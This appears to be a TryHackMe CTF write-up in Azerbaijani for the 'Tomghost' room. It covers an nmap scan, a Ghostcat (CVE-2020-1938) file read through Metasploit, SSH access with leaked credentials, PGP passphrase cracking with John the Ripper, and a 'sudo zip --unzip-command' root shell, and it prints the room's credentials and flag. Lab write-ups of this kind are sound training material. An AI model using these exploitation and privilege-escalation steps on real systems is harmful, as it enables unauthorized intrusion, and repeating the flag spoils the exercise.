# 🚩 TryHackMe – Tomghost CTF | Azərbaycanca Write-up

> **Room:** [tomghost](https://tryhackme.com/room/tomghost)  
> **Çətinlik:** Asan  
> **Kateqoriya:** Apache Tomcat, Ghostcat, PGP, Privilege Escalation  
> **Məqsəd:** User flag və Root flag əldə etmək  
> **Tamamlanma:** ✅ 100%

---

## 📖 Ümumi Baxış

Bu CTF tapşırığında köhnə Apache Tomcat serverindəki **Ghostcat (CVE-2020-1938)** zəifliyindən istifadə edərək sistemə daxil olub, PGP şifrəsini qıraraq yeni istifadəçiyə keçid edirik. Daha sonra `zip` alətinin sudo imtiyazından istifadə edərək root hüququ əldə edirik.

### Hücum Zənciri:
```
Nmap skan
    ↓
Port 8009 (AJP) → Ghostcat zəifliyi
    ↓
web.xml faylından kredensiallar → skyfuck:8730281lkjlkjdqlksalks
    ↓
SSH ilə daxil olmaq (skyfuck)
    ↓
credential.pgp + tryhackme.asc faylları
    ↓
gpg2john → john → PGP şifrəsi qırıldı
    ↓
gpg --decrypt → merlin:asuyusdoiuqoilkda312j31k2j123...
    ↓
SSH ilə merlin → user flag
    ↓
sudo zip exploit → root flag 🏆
```

---

## 🔎 Mərhələ 1: Nmap ilə Port Skan

### Nmap nədir?
**Nmap** — şəbəkədə açıq portları, işləyən xidmətləri və versiyalarını aşkar edən kəşfiyyat alətidir. Hər hücumun ilk addımı budur.

### Əmr:
```bash
nmap -sC -sV -oN scan.txt <HEDEF-IP>
```

### Parametrlərin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `-sC` | Default skriptləri işlət (əlavə məlumat topla) |
| `-sV` | Xidmət versiyalarını tap |
| `-oN scan.txt` | Nəticəni fayla yaz |

### Nəticə:
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
```

**Nə öyrəndik?**
- Port **22** — SSH (uzaqdan terminal bağlantısı)
- Port **8009** — AJP protokolu (Apache Tomcat) ⚠️ **Kritik!**
- Port **8080** — Tomcat veb interfeysi

---

## 🌐 Mərhələ 2: Apache Tomcat nədir?

**Apache Tomcat** — Java veb applikasiyalarını işlətmək üçün istifadə edilən açıq mənbəli bir server proqramıdır.

```
Brauzer → Port 8080 (HTTP) → Tomcat → Java Applikasiyası
                                ↕
              Port 8009 (AJP) ← Apache veb server
```

Port **8009**-da işləyən **AJP (Apache JServ Protocol)** isə Apache ilə Tomcat arasındakı daxili əlaqə protokoludur. Bu port adətən xarici istifadəçilərə bağlı olmalıdır — amma burada açıqdır!

---

## 💀 Mərhələ 3: Ghostcat Zəifliyi (CVE-2020-1938)

### Ghostcat nədir?
**Ghostcat** — 2020-ci ildə aşkar edilmiş, Apache Tomcat-ın AJP protokolundakı kritik bir zəiflikdir.

| Xüsusiyyət | Dəyər |
|-----------|-------|
| CVE | CVE-2020-1938 |
| CVSS Skoru | **9.8 (Kritik)** |
| Təsirli versiyalar | Tomcat 9.0.0–9.0.30, 8.5.0–8.5.50, 7.0.0–7.0.99 |
| Kəşf tarixi | 2020, Fevral |

### Nə edir?
Hücumçu AJP protokolu vasitəsilə serverdəki **istənilən faylı oxuya bilər** — o cümlədən `WEB-INF/web.xml` kimi konfiqurasiya fayllarını. Bu fayllarda çox vaxt istifadəçi adı və şifrə olur.

### Metasploit ilə istismar:
```bash
msfconsole
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <HEDEF-IP>
set RPORT 8009
run
```

### Nəticə — web.xml faylından tapılan kredensiallar:
```xml
<description>
   Welcome to GhostCat
      skyfuck:8730281lkjlkjdqlksalks
</description>
```

🎯 **İstifadəçi adı:** `skyfuck`  
🎯 **Şifrə:** `8730281lkjlkjdqlksalks`

---

## 🔐 Mərhələ 4: SSH ilə Daxil Olmaq (skyfuck)

```bash
ssh skyfuck@<HEDEF-IP>
# Şifrə: 8730281lkjlkjdqlksalks
```

Daxil olduqdan sonra ev qovluğuna baxaq:

```bash
ls -la
```

**Tapılan fayllar:**
```
credential.pgp   ← Şifrəli PGP faylı
tryhackme.asc    ← PGP açar faylı
```

---

## 🔑 Mərhələ 5: PGP Şifrəsini Qırmaq

### PGP nədir?
**PGP (Pretty Good Privacy)** — faylları şifrələmək üçün istifadə edilən bir sistemdir. Şifrəli faylı açmaq üçün həm **açar faylı** (.asc) həm də **passphrase** (açar şifrəsi) lazımdır.

Bizdə `tryhackme.asc` açar faylı var, amma passphrase-i bilmirik. Bunu **john** ilə qıracağıq.

### Addım 1 — Açarı import edib deşifrə cəhd et:
```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
# Passphrase istəyir — bilmirik, davam et
```

### Addım 2 — Faylları Kali maşınına kopyala:
```bash
# Kali terminalında:
scp skyfuck@<HEDEF-IP>:~/tryhackme.asc .
scp skyfuck@<HEDEF-IP>:~/credential.pgp .
```

### Addım 3 — gpg2john ilə hash çıxar:

**gpg2john nədir?** — GPG açar faylından John the Ripper-in anlaya biləcəyi hash formatı çıxaran alətdir.

```bash
gpg2john tryhackme.asc > hash.txt
```

### Addım 4 — John the Ripper ilə şifrəni qır:

**John the Ripper nədir?** — Hash şifrələrini wordlist (söz siyahısı) ilə müqayisə edərək qıran bir alətdir.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Nəticə:**
```
alexandru        (tryhackme)
```

🎯 **PGP Passphrase:** `alexandru`

### Addım 5 — credential.pgp faylını deşifrə et:
```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
# Passphrase sorulanda: alexandru
```

**Nəticə:**
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

🎯 **İstifadəçi adı:** `merlin`  
🎯 **Şifrə:** `asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

---

## 👤 Mərhələ 6: merlin ilə SSH və User Flag

```bash
ssh merlin@<HEDEF-IP>
# Şifrə: asuyusdoiuqoilkda312j31k2j123...
```

```bash
ls
cat user.txt
```

**User Flag:**
```
THM{GhostCat_is_so_cr4sy}
```

✅ **User flag alındı!**

---

## 🧪 Mərhələ 7: Sudo İmtiyazlarını Yoxlamaq

```bash
sudo -l
```

**Nəticə:**
```
(root : root) NOPASSWD: /usr/bin/zip
```

**Bu nə deməkdir?**  
`merlin` istifadəçisi **şifrəsiz** `zip` əmrini **root kimi** işlədə bilər. Bu privilege escalation üçün istifadə edilə bilər.

---

## ⚡ Mərhələ 8: Privilege Escalation — zip ilə Root

### zip niyə təhlükəlidir?
`zip`-in `--unzip-command` parametri ilə arxivi açarkən işlədiləcək xarici əmr təyin etmək olur. Biz bunu root shell açmaq üçün istifadə edəcəyik.

### Əmr:
```bash
sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"
```

### Parametrlərin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `sudo` | Root olaraq işlət |
| `/tmp/x.zip` | Çıxış zip faylı |
| `/etc/passwd` | Zip-ə əlavə ediləcək fayl (istənilən fayl olar) |
| `-T` | Zip faylını test et |
| `--unzip-command` | Test zamanı işlədiləcək xarici əmr |
| `"sh -c /bin/bash"` | Root bash shell aç |

**Nəticə:**
```
adding: etc/passwd (deflated 61%)
root@ubuntu:/#
```

### Root Flag:
```bash
cd /root
cat root.txt
```

✅ **Root flag alındı! Sistem tam ələ keçirildi! 🏆**

---

## ✅ Xülasə Cədvəli

| Mərhələ | Alət | Tapıntı |
|---------|------|---------|
| Port Skan | Nmap | 22 (SSH), 8009 (AJP), 8080 (Tomcat) |
| Ghostcat İstismarı | Metasploit | `skyfuck:8730281lkjlkjdqlksalks` |
| SSH Girişi | SSH | skyfuck kimi daxil olundu |
| PGP Hash | gpg2john | hash.txt yaradıldı |
| Şifrə Qırma | John the Ripper | Passphrase: `alexandru` |
| PGP Deşifrə | gpg | `merlin:asuyusdoiuqoilkda312...` |
| SSH Girişi | SSH | merlin kimi daxil olundu |
| User Flag | cat | `THM{GhostCat_is_so_cr4sy}` |
| Sudo Yoxlama | sudo -l | zip root olaraq işləyir |
| Privilege Escalation | zip exploit | Root shell açıldı |
| Root Flag | cat | `/root/root.txt` ✅ |

---

## 🎓 Öyrənilən Dərslər

1. **AJP portu (8009) xarici şəbəkəyə açıq olmamalıdır** — firewall ilə bağlanmalıdır
2. **Tomcat mütəmadi yenilənməlidir** — Ghostcat yalnız köhnə versiyalarda işləyir
3. **Konfiqurasiya fayllarında şifrə saxlamaq təhlükəlidir** — `web.xml` kimi fayllar
4. **PGP açar faylları güclü passphrase ilə qorunmalıdır** — `alexandru` çox zəif idi
5. **Sudo icazələri minimum saxlanmalıdır** — `zip` kimi alətlərə root icazəsi vermək təhlükəlidir
6. **GTFOBins** — [gtfobins.github.io](https://gtfobins.github.io) — sudo/SUID istismarı üçün əsas mənbə

---

## 🔗 Faydalı Linklər

- [TryHackMe – Tomghost Room](https://tryhackme.com/room/tomghost)
- [CVE-2020-1938 – Ghostcat](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)
- [GTFOBins – zip](https://gtfobins.github.io/gtfobins/zip/)
- [John the Ripper](https://www.openwall.com/john/)

---

*Yazıldı: 2026 | Platforma: TryHackMe | Azərbaycanca*
